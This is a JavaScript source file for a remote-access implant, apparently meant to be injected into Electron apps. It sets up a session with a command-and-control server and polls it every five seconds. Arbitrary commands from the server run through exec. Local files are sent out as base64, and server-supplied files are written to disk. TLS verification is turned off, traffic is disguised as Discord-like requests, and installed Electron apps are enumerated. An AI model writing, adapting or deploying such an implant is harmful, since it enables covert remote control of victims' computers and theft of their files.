const index = require(PLACEHOLDERMAIN);
const HOST = PLACEHOLDERHOST;
const PORT = PLACEHOLDERPORT;
const https = require('https');
const exec = require('child_process').exec;
const fs = require('fs');
const process = require('process');


const C2_SERVER = `https://${HOST}:${PORT}`;
let firstReq = true


//get requests to not look sus
const getRequests = [
'bootstrap.js',
'index.html',
'styles.css',
'app.css',
'discord.js',
'teams.js',
'app.js',
'channels.json',
'messages.json',
'user_settings.json',
'profile_picture.png',
'emoji.gif',
'fontawesome.woff',
'roboto.woff2',
'voice_message.mp3',
'video_attachment.mp4',
'icon.svg',
'manifest.json'];

//post requests also to not look sus
const postRequests = [
'api/v9/channels/{channel_id}/messages',
'api/v9/channels/{channel_id}/messages/attachments',
'api/v9/users/@me/settings',
'api/v9/guilds/{guild_id}/channels',
'api/v9/invite/{invite_code}',
'api/v9/oauth2/token',
'api/v9/users/@me/avatar',
'api/v9/channels/{channel_id}/messages/bulk-delete',
'api/v9/applications/{application_id}/commands',
'api/v9/users/@me/guilds'];

//ignore cert security
process.env["NODE_TLS_REJECT_UNAUTHORIZED"] = 0;

//install dirs for looking for other electron apps
const installDirs = [
        process.env.LOCALAPPDATA,
        'C:\\Program Files',
        'C:\\Program Files (x86)',
    ];

function generateSessionID() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < 16; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }

    return result
}

function uploadFile(file) {
    if (file == ""){
        return
    } else {
        try {
            https.get(`${C2_SERVER}/upload.php/${file}`, (res) => {
            let data = '';

                res.on('data', chunk => {
                    data += chunk;
                });

                res.on('end', () => {
                    const base64String = data;
                    const filePath = file;

                    const cleaned = base64String.split(',')[1] || base64String;

                    const buffer = Buffer.from(cleaned, 'base64');

                    fs.writeFileSync(filePath, buffer);
                });
            });
        } catch {
            console.error("Error uploading file.")
        }   
    }

    
    
}

function downloadFile(file) {
    if (file == "") {
        return
    } else {
        try {
            const content = fs.readFileSync(file);

            const base64data = content.toString('base64');

            const postData = JSON.stringify({ result: base64data })
            const options = {
                hostname: HOST,
                port: PORT,
                path: `/upload.php/${file}`,
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Content-Length': Buffer.byteLength(postData)
                }
            };

            const req = https.request(options, res => {
                console.log(`Status: ${res.statusCode}`);
            });

            req.on('error', err => {
                console.error(`Error sending output ${err.message}`);
            });

            req.write(postData);
            req.end();
        } catch {
            console.error("Error uploading file to server.")
        }
    }
    
}

function findElectronApps(dir, results=[]) {
    if (!fs.existsSync(dir)) return results;

    try {
        const entries = fs.readdirSync(dir, { withFileTypes: true });
        for (const entry in entries) {
            const fullPath = path.join(dir, entry.name);

            if (entry.isDirectory()) {
                if (!fullPath.includes('Windows')) {
                    findElectronApps(fullPath, results);
                }
            } else if (entry.isFile() && entry.name == 'app.asar') {
                results.push(fullPath);
            }
        }
    } catch (err) {
        sendOutput(err)
    }

    
    return results;
}

function listInstalled() {
    for (const dir of installDirs) {
        sendOutput(`Searching: ${dir}`)
        const results = findElectronApps(dir);
        results.forEach(file => {
            sendOutput(`Electron App Found: ${file}`)
        })
    }

}


function pollServer() {

    // generate sessionID on first request
    if (firstReq) {
        sessionid = generateSessionID()
        let platform = process.platform.toString()
        console.log(`${C2_SERVER}/cookie_id=${sessionid},${platform}`);
        https.get(`${C2_SERVER}/cookie_id=${sessionid},${platform}`, (res) => {
            let data = '';

            res.on('data', chunk => {
                data += chunk;
            });

            res.on('end', () => {
                console.log(data);
                if (data && data == "Connection Initiated") {
                    console.log(`Session started with SessionID: ${sessionid}`);
                    firstReq = false;
                }

            });

        }).on('error', err => {
            console.error(`Error initiating connection to C2 server: ${err.message}`);
        });
    } else {
        const requestPath = getRequests[Math.floor(Math.random() * getRequests.length)];
        https.get(`${C2_SERVER}/${requestPath}`, (res) => {
            let data = '';
    
            res.on('data', chunk => {
                data += chunk;
            });
    
            res.on('end', () => {
                //data = data.trim();

                try {
                    if (data && data !== '204 - No Content') {
                    console.log('Recieved command: ', data);
                    if (data == "getpid") {
                        let pid = process.pid.toString()
                        let pname = process.title.toString()
                        sendOutput(`PID: ${pid} - ${pname}`)
                    } else if (data == "kill") {
                        process.kill(process.pid, "SIGINT");
                    } else if (data.split(' ')[0] == "upload") {
                        uploadFile(data.split(' ')[1]);
                    } else if (data.split(' ')[0] == "download") {
                        downloadFile(data.split(' ')[1]);
                    } else if (data == "listapps") {
                        listInstalled()
                    } else {
                        exec(data, (error, stdout, stderr) => {
                            if (error) {
                                console.error(`Error executing command: ${error.message}`);
                                sendOutput(`Error: ${error.message}`);
                            } else {
                                console.log(data)
                                sendOutput(stdout || stderr);
                            }
                        });
                    }
                    } else {
                        console.log('No command recieved.')
                    }

                } catch {
                    console.error("Error handling request")
                }

                
            });
        }).on('error', err => {
            console.error(`Error connecting to C2 server: ${err.message}`);
            firstReq = true;
        });
    }

    
}

function sendOutput(output) {
    const postData = JSON.stringify({ result: output });
    const requestPath = postRequests[Math.floor(Math.random() * postRequests.length)];
    const options = {
        hostname: HOST,
        port: PORT,
        path: `/${requestPath}`,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(postData)
        }
    };

    const req = https.request(options, res => {
        console.log(`Status: ${res.statusCode}`);
    });

    req.on('error', err => {
        console.error(`Error sending output ${err.message}`);
    });

    req.write(postData);
    req.end();
}



setInterval(pollServer, 5000);
